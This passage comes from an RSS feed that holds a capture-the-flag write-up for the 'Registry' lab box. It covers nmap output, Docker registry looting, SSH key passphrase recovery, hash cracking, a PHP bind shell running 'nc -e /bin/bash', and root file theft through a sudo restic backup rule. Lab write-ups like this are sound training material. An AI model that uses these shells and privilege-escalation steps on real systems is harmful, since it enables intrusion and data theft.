| 7eWWELxItMHPVScwWpOA7B4INPM6USKGy7hUTFcPJZB7+ElTFO2h0c4MwFQcSqKW
| BUG+oUPpMOoO99ZRnX8D5/H3dvbuBsuqKgRrPmQnMehoWs7pNRUDudUnnLfGEJHh
| PEyspHOCbg1C6a0gI1xo0c0=
|_-----END CERTIFICATE-----
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/20%OT=22%CT=1%CU=40128%PV=Y%DS=2%DC=T%G=Y%TM=5DAC70
OS:4E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 33.561 days (since Tue Sep 17 02:05:49 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   27.26 ms 10.10.14.1
2   27.27 ms 10.10.10.159

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 20 15:33:50 2019 -- 1 IP address (1 host up) scanned in 27.77 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;There&amp;rsquo;s not much exposed here, namely the web ports - 80/443 are open. Both, by default, load a standard nginx 1.14.0 page. Trusty Ubuntu, I think. There appear to be no differences in version so its not, say, 2 separate instances running on a single machine. Before we start poking around I&amp;rsquo;ll set off a gobuster directory scan - that said, manual poking didn&amp;rsquo;t seem to give me much (i.e. robots.txt etc). Thankfully gobuster came back with some results for us to check out:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;skynet Boxes/Registry » cat dirb/registry_initial
/index.html (Status: 200)
/install (Status: 301)
/backup.php (Status: 200)
/bolt (Status: 301)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Backup.php loads into a blank page, with no underlying source exposed, so we won&amp;rsquo;t be able to do much with that unless we find a way to read it.&lt;/p&gt;
&lt;p&gt;Loading the &lt;code&gt;/bolt&lt;/code&gt; URI presents us with a templated webpage - I use the Wappalyzer extension in Firefox and that identifies this as Bolt CMS. After locating this on &lt;a href=&#34;https://github.com/bolt/bolt&#34; target=&#34;_blank&#34;&gt;Github&lt;/a&gt;
 I found there was a changelog.md file - loading that via the box shows that this is:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Bolt 3.6.4&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The latest version (at the time of these notes) is 3.6.10. Looking at common exploits for the version being used, the following matches this criteria:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Bolt CMS 3.6.4 - Cross-Site Scripting&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;That said, this appears to require authorization that we don&amp;rsquo;t have yet and there may be other channels to take here, so let&amp;rsquo;s look elsewhere first.&lt;/p&gt;
&lt;p&gt;The nmap scan shows port 443 as having an SSL with the common name of docker.registry.htb. Adding that to our hosts file and running gobuster scan against it gets us a directory called &lt;code&gt;v2&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;skynet Boxes/Registry » cat dirb/registry_registry.dirb
/v2 (Status: 401)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is protected by basic auth but I managed to bypass it with manual fuzzing - “admin:admin” are the correct creds, and this gives us access to a blank JSON interface. Looking at the headers of the page I can see this:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Docker-Distribution-Api-Version: registry/2.0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which suggests that this API endpoint is interfacing with Docker Registry - this is a docker tool that allows you to store docker images in a repository, which is part of a Docker Registry. In order to move forward we&amp;rsquo;re going to have to try and enumerate whether we have any data available to us through this endpoint. This page appears to be particularly useful in assisting us with that goal:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.docker.com/registry/spec/api/#listing-repositories&#34; target=&#34;_blank&#34;&gt;Docker Registry - Listing Repositories&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;That entire page is actually very useful but the anchor point in the URL above describes how to list available “repositories” - Following the guidance and visiting &lt;code&gt;/v2/_catalog&lt;/code&gt; shows us:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;~/HTB/Boxes/Registry curl http://docker.registry.htb/v2/_catalog -H &amp;quot;Authorization: Basic YWRtaW46YWRtaW4=&amp;quot;
{&amp;quot;repositories&amp;quot;:[&amp;quot;bolt-image&amp;quot;]}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A single repo exists, as you can see, with the name: &lt;code&gt;bolt-image&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now to see if we can pull this image. According to &lt;a href=&#34;https://5ysk3y.github.io/htb/guides/registry/&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
 pulling an image requires you to get two things: the image manifest and something called associated layer files. Layer files are a bit like chunked archives; you have a number of them that contain different parts of a wider data set. Once you have them all, you typically have what resembles an entire image. First off, to get the manifest, you visit:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://docker.registry.htb/v2/&amp;lt;name&amp;gt;/manifests/&amp;lt;reference&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have the &lt;code&gt;&amp;lt;name&amp;gt;&lt;/code&gt; (bolt-image) but the reference we needed was obtained using this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ~/HTB/Boxes/Registry curl http://docker.registry.htb/v2/bolt-image/tags/list -H &amp;quot;Authorization: Basic YWRtaW46YWRtaW4=&amp;quot;
{&amp;quot;name&amp;quot;:&amp;quot;bolt-image&amp;quot;,&amp;quot;tags&amp;quot;:[&amp;quot;latest&amp;quot;]}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The reference was the tag shown: &lt;code&gt;latest&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;That then translates to the following URL:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://docker.registry.htb/v2/bolt-image/manifests/latest&#34;&gt;http://docker.registry.htb/v2/bolt-image/manifests/latest&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Visiting or CURL&amp;rsquo;ing this outputs a tonne of data; one part of that data is a set of blobsums. These are the &amp;ldquo;layers&amp;rdquo; dockers documentation was referering to, earlier.&lt;/p&gt;
&lt;p&gt;To get individual layers, we can pull the blobsum list from this manifest:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ~/HTB/Boxes/Registry curl -s http://docker.registry.htb/v2/bolt-image/manifests/latest -X GET -H &amp;quot;Authorization: Basic YWRtaW46YWRtaW4=&amp;quot; | grep blobSum
&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&amp;quot;
&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee&amp;quot;
&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c&amp;quot;
&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7&amp;quot;
&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791&amp;quot;
&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&amp;quot;
&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0&amp;quot;
&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a&amp;quot;
&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797&amp;quot;
&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Taking the first of these blobsums and hitting the &lt;a href=&#34;http://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&#34; target=&#34;_blank&#34;&gt;proper URL&lt;/a&gt;
 with that gets us a binary file that (after following) turned out to be a tar.gz file containing a single script detailing some docker ssh info.. so, partial data.&lt;/p&gt;
&lt;p&gt;Now it would appear that, to be thorough, im going to need to download all of these blobs. So I used the above blobsum output with awk to grab the sha256:N poritions of that and then ran it through a loop with wget:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;for i in $(cat blobs); do wget --user admin --password admin http://docker.registry.htb/v2/bolt-image/blobs/$i -O $i.tar.gz; done&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Most of these are bytes in size, but two of them are larger: blob starting 2931 = 100mb and blob starting f476 = 36mb.&lt;/p&gt;
&lt;p&gt;Going through them to see whether, once all data is extracted, theres anything useful to find and we can confirm that there is. With all blobs downloaded we can now extract all the data to get a full image.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;N.B: I installed rename and ran the following command to easily rename all files for mass extraction (the colon after &amp;ldquo;sha256&amp;rdquo; in the filename was causing issues):&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt; ~/HTB/Boxes/Registry rename &#39;s/sha256://&#39; *&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Inspecting the extracted data suggests it is a full docker container image we&amp;rsquo;ve downloaded, as it contains most of the standard Linux file structure. In this case the useful folder was /root/.ssh - this contains a config file and a SSH key pair. The config file is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;skynet root/.ssh » cat config
Host registry
  User bolt
  Port 22
  Hostname registry.htb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This confirms the user (bolt) but we need a passphrase for the SSH key we have because connecting without one fails. I think I got slightly lucky here poking around the docker image we have because I found the following file:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./etc/profile.d/02-ssh.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Containing this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;skynet Registry/docker » cat ./etc/profile.d/02-ssh.sh
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect &amp;quot;Enter passphrase for /root/.ssh/id_rsa:&amp;quot;
send &amp;quot;GkOcz221Ftb3ugog\n&amp;quot;;
expect &amp;quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&amp;quot;
interact
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This shows a script that uses &lt;code&gt;expect&lt;/code&gt; to execute a command to add the SSH key we found to the system keychain - and in doing so, it exposes a password! I got a shell by using the user defined in the config file (bolt) and the id_rsa file we have. When it comes to the passphrase, the &lt;code&gt;\n&lt;/code&gt; at the end of the string is a literal new line, so it needs to be removed. Our full passphrase is &lt;code&gt;GkOcz221Ftb3ugog&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Upon logging in we get the user flag! Epic. We also have a direct login to the bolt user.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bolt@bolt:~$ wc -c user.txt
33 user.txt
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;Now we have a shell on the box, we can run an enumeration script to get a handle on things. There was nothing in the Bolt home folder that peaked my interest so I decided to run LinEnum which exposes a few interesting things. If we recall, earlier on, we stumbled across a CMS named Bolt that had an authenticated CVE - LinEmum gives us a way to potentially get around this by highlighting the &lt;code&gt;bolt.db&lt;/code&gt; file that the CMS is using to store data:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/var/www/html/bolt/tests/phpunit/unit/resources/db:
total 92K
drwxrwxr-x 2 www-data www-data 4.0K Oct  8 21:16 .
drwxrwxr-x 4 www-data www-data 4.0K Oct  8 21:16 ..
-rw-rw-r-- 1 www-data www-data  84K Oct  8 21:16 bolt.db
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And its SQLite3 format:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bolt@bolt:/var/www/html/bolt$ file /var/www/html/bolt/tests/phpunit/unit/resources/db/bolt.db
/var/www/html/bolt/tests/phpunit/unit/resources/db/bolt.db: SQLite 3.x database, last written using SQLite version 3020001
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The HTB machine didnt have SQLite available so I downloaded this locally and queried the most interesting table (the users table!) - I&amp;rsquo;ve had SQL give me the important info here but you can poke around the other tables if you wish to:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sqlite&amp;gt; select password from bolt_users where id=1;
password
------------------------------------------------------------
$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;N.B - the associated user for this password was &lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Running this through Hashcat gets us a password:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK : strawberry
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;ll also note another file I spotted through LinEnum located here:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/var/www/html/backup.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The contents of this are actually fairly interesting:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bolt@bolt:/var/www/html$ cat backup.php
&amp;lt;?php shell_exec(&amp;quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The file is owned by root but it also, very likely, exists for a reason. In knowledge of this we can now go back to the Bolt CMS with a view to pulling this all together.
Poking around on the &lt;a href=&#34;https://docs.bolt.cm/3.7/manual/login&#34; target=&#34;_blank&#34;&gt;Bolt CMS Knowledge Base&lt;/a&gt;
 you can see that their default admin URI is &lt;code&gt;/bolt&lt;/code&gt; - given that the CMS is installed into a directory of the same name, the full admin URL will be:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://10.10.10.159/bolt/bolt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;As we are unable to really do much with our Bolt user, the next step (given the path we&amp;rsquo;re taking) is to try and gain access to the underlying web user - we know that Bolt is susceptible to being exploited, and we&amp;rsquo;re now able to login. If we look around the CMS, we&amp;rsquo;ll quickly find out we have access to the bolt &lt;code&gt;config.yml&lt;/code&gt; file via the web interface - Configuration -&amp;gt; Main Configuration - browsing the contents will quickly help you realise that you&amp;rsquo;re unable to upload PHP files by default. You are, if you try it, able to override this by adding the PHP extension to the list of &lt;code&gt;accept_file_types: &lt;/code&gt; that are defined. All uploaded files go into the URI &lt;code&gt;/bolt/files/&lt;/code&gt; so its now possible to get code execution, without the need for a pre-written CVE.&lt;/p&gt;
&lt;p&gt;After a bit of playing around with file uploads, it&amp;rsquo;ll probably become apparant that PHP reverse shells don&amp;rsquo;t seem to work. If we go back the SSH access we have via the Bolt user, we can see whether iptables is configured to make our lives difficult:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bolt@bolt:/var/www/html$ cat /etc/iptables.conf | grep -i drop
-A OUTPUT -d 10.0.0.0/8 -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j DROP
-A OUTPUT -d 10.0.0.0/8 -p udp -j DROP
-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP
-A DOCKER-ISOLATION-STAGE-2 -o br-1bad9bd75d17 -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sneaky, sneaky! All outbound connections to any IP on the 10. range will be dropped - TCP connections will be dropped depending on the packet type that is sent. You&amp;rsquo;ll notice that ICMP is not included here, so pings will work successfully. This may have fooled some people into thinking their reverse shells should work. UDP connections are also blocked entirely. Which means that we&amp;rsquo;re going to need to try a &lt;strong&gt;bind&lt;/strong&gt; shell.&lt;/p&gt;
&lt;p&gt;For those that aren&amp;rsquo;t aware, a bind shell is (sorta) the opposite of a reverse shell; when you configure a reverse shell, you typically setup a listener on your host machine and have the remote machine connect &lt;em&gt;back to you&lt;/em&gt;. When that isn&amp;rsquo;t possible you may be able to configure a bind shell which means you configure the remote server to bind to a port on the &lt;em&gt;server-side&lt;/em&gt; that you then connect to from your host machine.&lt;/p&gt;
&lt;p&gt;Initially I tried using the version of &lt;code&gt;nc&lt;/code&gt; that was on the box, but this is an earlier version that doesn&amp;rsquo;t come compiled with the ability to use the &lt;code&gt;-e&lt;/code&gt; (execute) flag - therefore, in order to do this properly, I did the following:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1)&lt;/strong&gt; Upload a new copy of nc (inclusive of the execute flag) to a folder on the server (e.g. /dev/shm); this can be done using the bolt user over SCP. Also, change the file perms to 777.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2)&lt;/strong&gt; Update Bolt config via web GUI to allow for PHP file uploads (as explained above)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3)&lt;/strong&gt; Upload a PHP script that runs, via system(), nc on that server. It includes &lt;code&gt;/bin/bash&lt;/code&gt; as executable arguments and a listening port, e.g:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;skynet Registry/bolt » cat exploit.php
&amp;lt;?php
system(&#39;/dev/shm/nc -e /bin/bash -lvnp 9001&#39;);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;4)&lt;/strong&gt; Run the script via a browser to actually setup the listener on the box, e.g:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://10.10.10.159/bolt/files/exploit.php)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;5)&lt;/strong&gt; Connect from local machine, e.g;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;skynet Registry/bolt » nc 10.10.10.159 9001&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We now have a shell as the www-data user. I opted to quickly run another LinEnum scan with this user but, whilst that ran, I also decided to try some of the basics that didn&amp;rsquo;t work using our bolt user, namely our ability to run &lt;code&gt;sudo -l&lt;/code&gt; to list commands we can run, via that user, with sudo:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@bolt:~$ sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So the next step is to leverage the www-data account to create a backup using sudo and restic, through the REST protocol. In order to really exploit this without prior knowledge you need to look into two things:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Restic itself - I found the &lt;a href=&#34;https://restic.readthedocs.io/en/latest/&#34; target=&#34;_blank&#34;&gt;documentation&lt;/a&gt;
 rather comprehensive, at least in terms of figuring out how the backup/restore process works.&lt;/li&gt;
&lt;li&gt;Restic Rest Server - you&amp;rsquo;ll need to upload a compiled version of &lt;a href=&#34;https://github.com/restic/rest-server&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
 binary in order to exploit this properly.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Armed with some new syntaxical knowledge and a restic REST binary (confusing, I know) we can try and root this box.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;N.B - I opted to do all of this on the remote machine due to the restrictions we showed earlier with the firewall. You could use Chisel or SSH to point the &lt;a href=&#34;https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server&#34; target=&#34;_blank&#34;&gt;default REST port&lt;/a&gt;
 (8000) back to your machine, before you handle all of this between remote/local hosts.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The method I used was as follows:&lt;/p&gt;
&lt;p&gt;Firstly, create a directory, via the bolt user - this will be used to host a repository, e.g. (the default) /tmp/restic. From there initialize that folder with restic as a repo:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bolt@bolt:~$ restic init --repo /tmp/restic&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This configures literally everything for you as well as prompting you to setup a repo password.&lt;/p&gt;
&lt;p&gt;From there I uploaded a copy of a binary I referenced earlier called ‘rest-server’ - this was downloaded and compiled (pretty quickly via golang) on my Kali box. I then uploaded it via scp using the bolt user and hosted the newly created repo via the rest-server binary:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bolt@bolt:~$ ./rest-server --no-auth&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;N.B: If you do not use the default /tmp/restic path as your repository folder, you&amp;rsquo;ll need to specify the full path of your repo using the &amp;ndash;path argument with rest-server&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This starts the server on its default port (8080) and /tmp/restic is the default data directory.&lt;/p&gt;
&lt;p&gt;From there we hop onto the www-data user, and run the following command to backup the machines &lt;code&gt;/root&lt;/code&gt; directory into our local REST repository - all of this was achieved by simply reading the Restic docs:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@bolt:~/html$ sudo restic backup -r rest:http://127.0.0.1:8000/ /root
enter password for repository: password
password is correct
found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root]
scanned 10 directories, 14 files in 0:00
[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00
duration: 0:00
snapshot 898355a7 saved
www-data@bolt:~/html$
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Back on our bolt user, we then list the snapshots we have in the repo:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bolt@bolt:~$ restic -r /tmp/restic snapshots&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And restore the one we want, e.g:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bolt@bolt:~$ restic -r /tmp/restic restore latest --target /tmp/restic --path &amp;quot;/root&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;--path&lt;/code&gt; argument just defines the directory we want to restore from the listed snapshots. The &lt;code&gt;--target&lt;/code&gt; argument defines the folder into which the data gets restored. As the original owner of the files was root, restic will try and chown the files back to that ownership when you run the restore; this will fail because the bolt user cannot change file permissions to the root user. I outline this because the ownership change failures get shown as errors in the restore output which can be deceiving; the data does get restored. In this case we got the entire contents of the /root folder, including the flag file and the .ssh folder containing a key we can use to connect via SSH, without a passphrase.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@bolt:~# wc -c root.txt
33 root.txt
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;And that&amp;rsquo;s the box! For those interested, this introduction to Restic caused me to migrate over to that application for my home backups and it&amp;rsquo;s genuinely brilliant. The weakness here was in the way sudo had been configured to allow backups to be taken of root owned files by a non-root user, not the restic application itself.&lt;/p&gt;
&lt;p&gt;I hope you enjoyed the read.&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
